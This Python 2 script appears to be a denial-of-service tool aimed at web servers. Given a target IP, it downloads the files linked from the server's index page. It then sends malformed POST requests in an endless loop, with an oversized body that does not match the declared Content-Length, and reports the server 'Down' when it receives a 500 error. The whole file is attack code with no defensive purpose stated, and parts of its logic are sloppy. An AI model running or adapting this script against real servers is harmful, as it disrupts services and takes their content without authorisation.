import sys
import socket
import os
import time
R = '\033[31m'
G = '\033[32m'
W = '\033[0m'
over = 'admin'*50
payload = 'POST / HTTP/1.1\r\nHost: asdasdasd\r\nUser-Agent: asdasdasd\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nReferer: asdasdasdasd\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n' + over + '\r\n\r\n'
try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((sys.argv[1], 80))
   print G + '[*]' + W + ' Connecting'
   s.send('GET /\n')
   print G + '[*]' + W + ' Getting files'
   res = s.recv(10000)
   x = 0
   res1 = res.lower()
   res1 = res1.splitlines()
   while x < len(res1):
      if 'href=' in res1[x]:
         res2 = res1[x]
         res3 = res2.index('href=')
         res4 = res2[res3+5:]
         X1 = ''
         for X in res2[res3+5:]:
            X1 += X
            if X == ' ':
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               s.connect((sys.argv[1], 80))
               s.send('GET /' + X1.replace('"', '').replace("'", '').replace(' ', '') + '\n')
               f = open('f'+str(x), 'w')
               print G + '[*]' + W + ' Saving file ', X1, 'as /f'+str(x)
               f.write(s.recv(1000))
               break

      x = x+1

except Exception as e:
   if 'list index out of range'in e:
      print R + '[!]' + W + ' Write : python ', sys.argv[0], ' Ip of Server\n ex( python ', sys.argv[0],' 127.0.0.1 )'
   elif 'Invalid argument' in e:
      print R + '[!]' + W + ' Please Write the true server\n'
   elif 'No route to host' in e:
      print R + '[!]' + W + ' This server is down\n'
   print (e)
   exit()
try :
   while 1:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((sys.argv[1], 80))
      s.send(payload)
      print G + '[*]' + W + ' Sending Payload '
      rec = s.recv(10000)

      if '500 Internal Error' in rec:
         print G + '[*]' + W + ' The server is Down'
      else:
         print R + '[!]' + W + ' This server is not httpd server'
         time.sleep(5)
except KeyboardInterrupt:
   print  G +' Good bye!!' + W
except Exception as e:
   print e
